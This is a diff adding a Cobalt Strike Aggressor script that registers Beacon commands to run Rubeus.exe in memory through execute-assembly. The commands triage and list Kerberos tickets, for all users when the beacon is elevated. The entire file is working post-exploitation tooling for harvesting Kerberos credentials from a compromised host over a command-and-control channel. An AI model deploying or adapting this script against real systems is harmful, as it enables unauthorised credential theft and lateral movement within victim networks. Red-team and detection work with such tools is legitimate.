@@ -1,0 +1,36 @@
+
+# Path to Rubeus.exe
+$rubeus = "Rubeus.exe";
+
+
+beacon_command_register("rubeus", "Runs execute-assembly rubeus.exe", "Syntax: rubeus args\n");
+beacon_command_register("rubeus_triage", "Runs execute-assembly rubeus.exe triage", "Syntax: rubeus_triage\n");
+beacon_command_register("klist", "Runs execute-assembly rubeus.exe klist", "Syntax: klist\n");
+     
+
+# Run Rubeus
+sub rubeus {
+	if (-exists script_resource($rubeus)) {
+   	    btask($1, "Tasked Beacon to execute Rubeus.exe  $+ $2 $+ ", 'T1204');
+        bexecute_assembly!($1, script_resource($rubeus), $2);
+	} else {
+        berror($1, "$rubeus does not exist :(");
+    }
+}
+alias rubeus {
+    rubeus($1, $2);
+}
+
+# Triage all current tickets (if elevated, list for all users), optionally targeting a specific LUID,
+# username, or service:
+alias rubeus_triage {
+    rubeus($1, "triage");
+
+}
+
+# List all current tickets in detail (if elevated, list for all users), optionally targeting a
+# specific LUID:
+alias klist {
+    rubeus($1, "klist");
+}
+
